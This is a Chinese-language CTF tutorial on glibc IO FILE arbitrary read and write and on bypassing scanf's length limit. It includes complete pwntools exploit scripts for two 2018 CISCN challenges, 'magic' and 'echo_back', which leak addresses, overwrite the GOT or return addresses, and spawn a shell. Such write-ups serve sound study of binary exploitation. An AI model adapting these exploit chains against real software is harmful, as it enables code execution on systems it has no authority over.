> 原文链接: https://www.anquanke.com//post/id/194577 


# IO FILE之任意读写和scanf的限制绕过


                                阅读量   
                                **1441130**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">3</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t01e9e69c85a4ce5dd1.png)](https://p2.ssl.qhimg.com/t01e9e69c85a4ce5dd1.png)



本文将简单介绍一下scanf的长度绕过和由fwrite、fread实现的任意读写，然后用两个ctf例题（2018年的两道国赛题 echo_back 和 magic）来加深理解。

本文中write_s,write_e,read_s,read_e分别表示开始写入的开始结束地址、读取的开始结束地址。



## fread 之 stdin任意写

网上介绍fread源码分析的文章很多，所以本文就不着重分析他的详细流程了。

首先先介绍一下file结构(FILE在Linux系统的标准IO库中是用于描述文件的结构，称为文件流。 FILE结构在程序执行fopen等函数时会进行创建，并分配在堆中。我们常定义一个指向FILE结构的指针来接收这个返回值。)

FILE结构定义在libio.h中

```
struct _IO_FILE `{`
  int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */
#define _IO_file_flags _flags

  /* The following pointers correspond to the C++ streambuf protocol. */
  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
  char* _IO_read_ptr;   /* Current read pointer */
  char* _IO_read_end;   /* End of get area. */
  char* _IO_read_base;  /* Start of putback+get area. */
  char* _IO_write_base; /* Start of put area. */
  char* _IO_write_ptr;  /* Current put pointer. */
  char* _IO_write_end;  /* End of put area. */
  char* _IO_buf_base;   /* Start of reserve area. */
  char* _IO_buf_end;    /* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
#if 0
  int _blksize;
#else
  int _flags2;
#endif
  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */

#define __HAVE_COLUMN /* temporary */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  /*  char* _save_gptr;  char* _save_egptr; */

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
`}`;
```

先着重介绍其中要用到的指针：
- _IO_buf_base：输入（出）缓冲区的基地址，_IO_file_xsgetn函数会通过它来判断输入缓冲区是否为空，为空则会调用_IO_doallocbuf函数来进行初始化。
- _IO_buf_end：输入（出）缓冲区的结束地址。
- _IO_read_ptr：指向当前要写入的地址。
- _IO_read_end：一般和_IO_read_ptr共同使用，_IO_read_end-_IO_read_ptr表示可用的输入缓冲区大小。
接下来是实现任意写的过程：

在_IO_file_xsgetn中：

```
if (fp-&gt;_IO_buf_base == NULL)
会判断输入缓冲区是否为空，为空则调用_IO_doallocbuf。
我们是不希望他初始化缓冲区的，所以要构造fp-&gt;_IO_buf_base != NULL
```

```
have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;

      if (have &gt; 0) 
      `{`
          将输入缓冲区中的内容拷贝至目标地址。
      `}`

这里我们要实现任意写，就不能满足这个条件，一般构造_IO_read_end ==_IO_read_ptr，这样的话缓冲区就满足不了当前的需求，就会接着调用__underflow
```

__underflow（_IO_new_file_underflow）中有两个判断需要绕过：

1、

```
if (fp-&gt;_flags &amp; _IO_NO_READS)

满足的话就会直接返回；所以这里要保证_flag位中不能有四。
```

2、

```
if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)
    return *(unsigned char *) fp-&gt;_IO_read_ptr;

这里满足的话也会直接返回，所以我们一般构造_IO_read_end ==_IO_read_ptr。

因为最终调用的是read (fp-&gt;_fileno, buf, size))，所以我们还要构造
fp-&gt;_fileno为0。
```

小结一下：
- 设置_IO_buf_base为write_s，_IO_buf_end为write_end（_IO_buf_end-_IO_buf_base要大于0）
- flag位不能含有4（_IO_NO_READS），_fileno要为0。（最好就直接使用原本的flag）
- 设置_IO_read_end等于_IO_read_ptr。
_IO_new_file_underflow中在执行系统调用之前会设置一次FILE指针，将<br>
_IO_read_base、_IO_read_ptr、fp-&gt;_IO_read_end、_IO_write_base、IO_write_ptr全部设置为_IO_buf_base。

这个内容后面的题目magic要用到，先在这里提一下。

```
fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;
  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;
  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end
    = fp-&gt;_IO_buf_base;

  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,
           fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);
```



## scanf 的长度修改：

scanf是调用stdin中的_IO_new_file_underflow去调用read的（和fread相同）。

这里依旧是上面的那几个关键代码：

```
一：·········································
if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)  
    return *(unsigned char *) fp-&gt;_IO_read_ptr;  

二：·········································
count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,  fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);  

三：·········································
fp-&gt;_IO_read_end += count;
```

我们可以知道它是向fp-&gt;_IO_buf_base处写入（fp-&gt;_IO_buf_end – fp-&gt;_IO_buf_base）长度的数据。

只要我们可以修改_IO_buf_base和_IO_buf_end就可以实现任意位置任意长度的数据写入。

第三部分我们放到题目each_back中来分析。



## fwrite 之 stdout任意读写

因为stdout会将缓冲区中的数据输出出来，所以就具有了stdin没有的任意读功能。

首先说一下涉及到的指针：
- _IO_write_base：输出缓冲区基址。
- _IO_write_end：输出缓冲区结束地址。
- _IO_write_ptr：_IO_write_ptr和_IO_write_base之间的地址为已使用的缓冲区，_IO_write_ptr和_IO_write_end之间为未使用的缓冲区。
- _IO_buf_base：输入（出）缓冲区的基地址。
- _IO_buf_end：输入（出）缓冲区的结束地址。
### <a class="reference-link" name="%E4%BB%BB%E6%84%8F%E5%86%99%EF%BC%9A"></a>任意写：

```
else if (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)
    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;
if (count &gt; 0)
`{`
    把数据拷贝到缓冲区。
`}`
他的任意写是基于_IO_new_file_xsputn中将数据复制到缓冲区这一功能能实现的。
```

所以我们只要构造_IO_write_ptr为write_s，_IO_write_end为write_e，自然就满足了if的条件，这样就达到了任意写的目的。

### <a class="reference-link" name="%E4%BB%BB%E6%84%8F%E8%AF%BB%EF%BC%9A"></a>任意读：

简单写一下fwrite的关键流程：

_IO_new_file_xsputn —&gt; _IO_OVERFLOW(_IO_new_file_overflow) —&gt;<br>
_IO_do_write

```
else if (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)
    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;
if (count &gt; 0)
`{`
    把数据拷贝到缓冲区。
`}`
if (to_do + must_flush &gt; 0)
    `{`
      if (_IO_OVERFLOW (f, EOF) == EOF)


这里不同于上面的任意读，我们不希望他将数据拷贝到缓冲区中，这里一般构造f-&gt;_IO_write_end = f-&gt;_IO_write_ptr。
之后就会去调用_IO_OVERFLOW（_IO_new_file_overflow）
```

```
_IO_new_file_overflow中有两个对flag位的检查

if (f-&gt;_flags &amp; _IO_NO_WRITES)
if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL)

所以flag位要不包含8和0x800
```

```
接下来就会调用：
if (ch == EOF)
    return _IO_do_write (f, f-&gt;_IO_write_base,
             f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);
  return (unsigned char) ch;
```

其中_IO_do_write函数的作用是输出缓冲区，我们这里要构造_IO_write_base为read_s，构造_IO_write_ptr为read_e。

在_IO_do_write中还有几个判断需要绕过：

```
if (fp-&gt;_flags &amp; _IO_IS_APPENDING)

else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)
```

flag位不能包含 0x1000（_IO_IS_APPENDING），并且要构造fp-&gt;_IO_read_end = fp-&gt;_IO_write_base。

最后构造f-&gt;_fileno为1。

小结：
- flag位： 不能包含0x8、0x800、0x1000（最好就直接使用原本的flag）
- 构造_fileno为1
- 构造_IO_write_base=read_s，_IO_write_ptr=read_e。


## 例题：

### <a class="reference-link" name="2018%20ciscn%20magic%EF%BC%9A"></a>2018 ciscn magic：

首先查看一下保护：

[![](https://p1.ssl.qhimg.com/t01e3b21482f13bfefe.png)](https://p1.ssl.qhimg.com/t01e3b21482f13bfefe.png)

没有开启pie保护，Partial RELRO意味着我们可以修改函数got表。

放入ida种简单查看一下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01ac7149b67694bdc9.png)

是个菜单题,上面只给出了三个功能，但是序号很蹊跷，正好跳过了3，我们通过阅读代码可以知道它是有3这个隐藏功能的，但因为解题过程中没有用到，就不说他了。

这道题的关键点在于功能二的以下部分中：

[![](https://p3.ssl.qhimg.com/t01fb3833f66fe4b022.png)](https://p3.ssl.qhimg.com/t01fb3833f66fe4b022.png)

首先看一下write_spell和read_spell函数：

[![](https://p2.ssl.qhimg.com/t018e903a7bdd389f1a.png)](https://p2.ssl.qhimg.com/t018e903a7bdd389f1a.png)

[![](https://p2.ssl.qhimg.com/t01f7f261bfa45d9ce1.png)](https://p2.ssl.qhimg.com/t01f7f261bfa45d9ce1.png)

我们发现这两个函数调用了fwrite和fread函数，并且使用了自己创建的file结构。

而且fread函数后面还跟着一个write函数，结合上面提到的：

```
have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;

      if (have &gt; 0) 
      `{`
          将输入缓冲区中的内容拷贝至目标地址。
      `}`
```

这里的目标地址，就是write函数要输出内容所在的地址，也就是说如果我们能控制log_file结构，就可以利用read_spell函数来泄漏libc基址以及heap的基址。

那么要如何做到控制log_file呢：

我们看到最下面有一个 *（v3 + 0x28）-=50ll，那么我们看一下v3是什么：

[![](https://p5.ssl.qhimg.com/t0197c6b24a35a8a50b.png)](https://p5.ssl.qhimg.com/t0197c6b24a35a8a50b.png)

这里是存在数组下标越界的

[![](https://p5.ssl.qhimg.com/t010e37b1a0aac7b725.png)](https://p5.ssl.qhimg.com/t010e37b1a0aac7b725.png)

而指向log_file的指针正好位于数组的上方，所以我们让v2为-2的话，*（v3 + 0x28）-=50ll 就会修改的是log_file中的_IO_write_ptr。那么我们就要利用它来修改_IO_write_ptr。

```
这里要注意每次fwrite后会将输出的长度加到_IO_write_ptr上，修改的时候一定要注意。
*f-&gt;_IO_write_ptr++ = ch;
```

通过调试可以知道log_file结构位于我们create的堆地址上方。

```
for i in range(12):
        spell(p, -2, 'x00')  
    spell(p, -2, 'x00' * 13)
    spell(p, -2, 'x00' * 9)

```

[![](https://p1.ssl.qhimg.com/t0146b26e780cb6557e.png)](https://p1.ssl.qhimg.com/t0146b26e780cb6557e.png)

可以看到此时已经将_IO_write_ptr修改为log_file结构内部的地址。

```
spell(p, 0, 'x00' * 3 + p64(0x231) + p64(0xfbad24a8))
    spell(p, 0, p64(puts_got) + p64(puts_got + 0x100))

    libc_addr = u64(p.recvn(6).ljust(8,'x00')) - puts_offest
```

利用上文说到的方法就可以泄漏出libc基址。

但是我们还需要heap基址用于got表修改，所以需要再泄漏一个地址，所以我们要使_IO_write_ptr指向泄漏libc之前的位置。

```
spell(p, -2, p64(0) + p64(0))
```

这样之后就可以用相同的方法再泄漏heap的基址：

```
spell(p, 0, 'x00' * 2 + p64(0x231) + p64(0xfbad24a8))
    spell(p, 0, p64(log_addr) + p64(puts_got + 0x100) + p64(0))
    heap_addr = u64(p.recvn(8)) - 0x10
```

接下来是修改got表部分：

```
spell(p, 0, p64(heap_addr + 0x58) + p64(0) + p64(heap_addr + 0x58))
spell(p, 0, p64(0x602122) + p64(0x602123 + 0x100))
```

在泄漏完heap基址后，log_file结构如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01eb8a6e75d522a7a4.png)

可以看到_IO_write_ptr为0x2042030，这样的话我们去执行上面脚本的第一行，因为输出的长度为0x18，这样修改的话就会变成下图这样：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01ec2876cae10710db.png)

这样的话，就符合了我们上面说的任意写的条件，接下来就可以去修改_IO_buf_baseh和_IO_buf_end。（也就是第二行代码）。

我在上文提到了：

_IO_new_file_underflow中在执行系统调用之前会设置一次FILE指针，将<br>
_IO_read_base、_IO_read_ptr、fp-&gt;_IO_read_end、_IO_write_base、IO_write_ptr全部设置为_IO_buf_base。

所以我们在执行完上面两行代码后_IO_write_ptr就会指向0x602122（它位于fwrite函数got表的下方）

接下来我们就要调整IO_write_ptr的值来修改got表。

```
spell(p, -2, 'x00')
    spell(p, -2, 'x01')
    spell(p, -2, 'x00')
    spell(p, 0, 'x00' * 2 + p64(libc_addr + system_offest)[0 : 6])
    spell(p, 0, '/bin/sh')
```

这里有一点需要注意，就是spell(p, -2, ‘x01’)，这里必须要大于0，因为：

[![](https://p2.ssl.qhimg.com/t019d37114e852bbaff.png)](https://p2.ssl.qhimg.com/t019d37114e852bbaff.png)

这里如果满足不了第一个if，就会跳转到muggle那部分。

完整的exp：

```
# coding:utf-8
from pwn import *
context(arch = 'amd64', os = 'linux')
context.log_level = 'debug'
debug=1

ip='111.198.29.45'
port='31577'
if debug == 1:
   p = process('./magic')
else:
   p = remote(ip, port)

puts_offest = 0x6f690
system_offest = 0x45390
puts_got = 0x602020
fwrite_got = 0x602090
log_addr = 0x6020E0
def debug():
    gdb.attach(p)
    pause()
def create(p, name):
    p.recvuntil('choice&gt;&gt; ')
    p.sendline('1')
    p.recvuntil('name:')
    p.send(name)

def spell(p, index, data):
    p.recvuntil('choice&gt;&gt; ')
    p.sendline('2')
    p.recvuntil('spell:')
    p.sendline(str(index))
    p.recvuntil('name:')
    p.send(data)

def final(p, index):
    p.recvuntil('choice&gt;&gt; ')
    p.sendline('3')
    p.recvuntil('chance:')
    p.sendline(str(index))

def pwn():
    create(p, 'sss')
    spell(p, 0, 'yyyyy')

    for i in range(12):
        spell(p, -2, 'x00')  
    spell(p, -2, 'x00' * 13)
    spell(p, -2, 'x00' * 9)
    #debug()

    spell(p, 0, 'x00' * 3 + p64(0x231) + p64(0xfbad24a8))
    spell(p, 0, p64(puts_got) + p64(puts_got + 0x100))

    libc_addr = u64(p.recvn(6).ljust(8,'x00')) - puts_offest
    log.info('libc addr is : ' + hex(libc_addr))
    #debug()
    spell(p, -2, p64(0) + p64(0))
    spell(p, 0, 'x00' * 2 + p64(0x231) + p64(0xfbad24a8))
    spell(p, 0, p64(log_addr) + p64(puts_got + 0x100) + p64(0))
    heap_addr = u64(p.recvn(8)) - 0x10
    log.info('heap addr is : ' + hex(heap_addr))
    debug()
    spell(p, 0, p64(heap_addr + 0x58) + p64(0) + p64(heap_addr + 0x58))
    #debug()
    spell(p, 0, p64(0x602122) + p64(0x602123 + 0x100))
    spell(p, -2, 'x00')
    spell(p, -2, 'x01')
    spell(p, -2, 'x00')
    spell(p, 0, 'x00' * 2 + p64(libc_addr + system_offest)[0 : 6])
    spell(p, 0, '/bin/sh')
    p.interactive()

if __name__ == '__main__':
    pwn()
```

### <a class="reference-link" name="2018%20ciscn%20each_back"></a>2018 ciscn each_back

[![](https://p4.ssl.qhimg.com/t01cfe578884e7ccc79.png)](https://p4.ssl.qhimg.com/t01cfe578884e7ccc79.png)

日常检查，保护全家桶。

这道题的格式化字符串漏洞很明显

因为它开启了pie，所以我们最开始的思路就是要泄漏出一些我们需要的地址。

首先查看stack，寻找一些有用的信息：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01f0ee963e653ccf46.png)

这里我标出了三个内容（计算偏移时不要忘了这是64位程序，前六个参数保存在寄存器里）：

1.main函数的ebp

2.函数的返回地址，它对应main函数中的地址，所以我们可以借此获得程序的基地址（elf_ddr）

3.可以得到libc基址

printf函数返回地址的求法：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01b28d54cb0a53d5a0.png)

[![](https://p1.ssl.qhimg.com/t015bd51049bf3dbd89.png)](https://p1.ssl.qhimg.com/t015bd51049bf3dbd89.png)

因为main函数里并没有修改rbp、rsp，所以这里printf函数的返回地址为main函数的rsp（也就是我们这里泄漏出的ebp） -0x28。

今天的重头戏来了：

他限制了我们输入的长度不能超过7，我们要想修改函数返回地址，payload不可能比7字节短，所以我们这里要找其他输入payload的方式，这里我们盯上了scanf函数。

我们就用上文提到的方法来修改scanf可输入的长度：

```
payload = p64(libc.address+0x3c4963)*3 + p64(stack_addr-0x28)+p64(stack_addr+0x10)
p.send(payload)
```

这里就有一点需要注意了，上文我留下的第三部分，就是：

```
fp-&gt;_IO_read_end += count;
```

我们在修改完长度之后,_IO_read_end就会加上我们payload长度的大小，这样就会导致后面输入payload来修改返回地址时，fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end的条件无法实现，所以我们这里利用getchar函数（每次会使_IO_read_ptr+1）来让这个条件满足：

[![](https://p5.ssl.qhimg.com/t01de31f99776268b28.png)](https://p5.ssl.qhimg.com/t01de31f99776268b28.png)

```
for i in range(len(payload)-1):
    p.recvuntil('choice&gt;&gt;')
    p.sendline('2') 
    p.recvuntil('length:')
    p.sendline('')

```

这里主要说一下scanf的利用，关于格式化字符串的内容就不过多的叙述。

完整exp：

```
#coding:utf-8
from pwn import *
context.log_level = 'debug'
debug = 1
elf = ELF('./echo_back')

if debug:
     p = process('./echo_back')
     libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
     context.log_level = 'debug'

else:
     p = remote('', xxxx)
     libc = ELF('./libc.so.6')
def dubug():
    gdb.attach(p)
    pause()

def set_name(name):
    p.recvuntil('choice&gt;&gt;')
    p.sendline('1')
    p.recvuntil('name')
    p.send(name)

def echo(content):
    p.recvuntil('choice&gt;&gt;')
    p.sendline('2') 
    p.recvuntil('length:')
    p.sendline('-1')
    p.send(content)
#----------------------------stack----------------------------------------------
echo('%12$pn')
p.recvuntil('anonymous say:')
stack_addr = int(p.recvline()[:-1],16)
#----------------------------elf---------------------------------------------
echo('%13$pn')
p.recvuntil('anonymous say:')
pie = int(p.recvline()[:-1],16)-0xd08
#----------------------------libc---------------------------------------------
echo('%19$pn')
p.recvuntil('anonymous say:')
libc.address = int(p.recvline()[:-1],16)-240-libc.symbols['__libc_start_main']
print '[+] system :',hex(libc.symbols['system'])
set_name(p64(libc.address + 0x3c4918)[:-1])
echo('%16$hhn')
p.recvuntil('choice&gt;&gt;')
p.sendline('2') 
p.recvuntil('length:')
payload = p64(libc.address+0x3c4963)*3 + p64(stack_addr-0x28)+p64(stack_addr+0x10)
p.send(payload)
p.sendline('')
for i in range(len(payload)-1):
    p.recvuntil('choice&gt;&gt;')
    p.sendline('2') 
    p.recvuntil('length:')
    p.sendline('')

p.recvuntil('choice&gt;&gt;')
p.sendline('2') 
p.recvuntil('length:')
payload = p64(pie+0xd93)+p64(next(libc.search('/bin/sh')))+p64(libc.symbols['system'])
p.sendline(payload)
p.sendline('')
p.interactive()

```

参考资料：

[https://ray-cp.github.io/archivers/IO_FILE_arbitrary_read_write](https://ray-cp.github.io/archivers/IO_FILE_arbitrary_read_write)

[https://wiki.x10sec.org/pwn/io_file/introduction/](https://wiki.x10sec.org/pwn/io_file/introduction/)
